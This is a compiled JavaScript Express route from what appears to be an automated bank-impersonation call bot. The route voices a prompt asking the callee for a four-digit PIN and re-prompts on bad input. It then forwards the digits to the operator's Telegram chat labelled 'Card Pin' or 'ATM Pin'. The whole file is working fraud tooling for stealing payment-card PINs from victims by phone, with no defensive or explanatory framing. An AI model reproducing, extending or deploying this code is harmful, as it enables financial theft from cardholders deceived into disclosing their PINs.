"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
const __1 = require("../..");
const __2 = require("../");
const uuid_1 = require("uuid");
const languages_1 = require("../../languages");
__2.app.all('/calls/pin/:chatId/:language', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    const { chatId, language } = req.params;
    const { variables } = req.query;
    const { dtmf } = JSON.parse(variables);
    if (!dtmf) {
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call PIN STEP - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangPin)({
                            step: `1`,
                            language: language,
                        }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 8,
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 8,
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
                    },
                },
            ],
        });
    }
    if (dtmf) {
        if (dtmf.length !== 4) {
            return res.json({
                id: (0, uuid_1.v4)(),
                title: `call PIN STEP - ${chatId}`,
                record: false,
                steps: [
                    {
                        id: (0, uuid_1.v4)(),
                        action: 'say',
                        options: {
                            payload: (0, languages_1.getLangPin)({
                                step: `2`,
                                language: language,
                            }),
                            language,
                            voice: 'female',
                        },
                        onKeypressGoto: 'nextStepGoto',
                        onKeypressVar: 'dtmf',
                        endKey: '#',
                        maxNumKeys: 8,
                    },
                    {
                        id: (0, uuid_1.v4)(),
                        action: 'pause',
                        options: {
                            length: 5,
                        },
                        onKeypressGoto: 'nextStepGoto',
                        onKeypressVar: 'dtmf',
                        endKey: '#',
                        maxNumKeys: 8,
                    },
                    {
                        id: 'nextStepGoto',
                        action: 'fetchCallFlow',
                        options: {
                            url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
                        },
                    },
                ],
            });
        }
        yield __1.bot.telegram.sendMessage(req.params.chatId, req.params.language === 'en-us'
            ? `Card Pin is <b>${dtmf}</b> 💳`
            : `ATM Pin is <b>${dtmf}</b> 🔑`, {
            parse_mode: 'HTML',
        });
    }
    return res.json({
        id: (0, uuid_1.v4)(),
        title: `call bank - ${chatId} no OTP`,
        record: false,
        steps: [
            {
                id: (0, uuid_1.v4)(),
                action: 'say',
                options: {
                    payload: (0, languages_1.getLangPin)({
                        step: `3`,
                        language: language,
                        dtmf: dtmf.split('').join(', '),
                    }),
                    language,
                    voice: 'female',
                },
            },
        ],
    });
}));
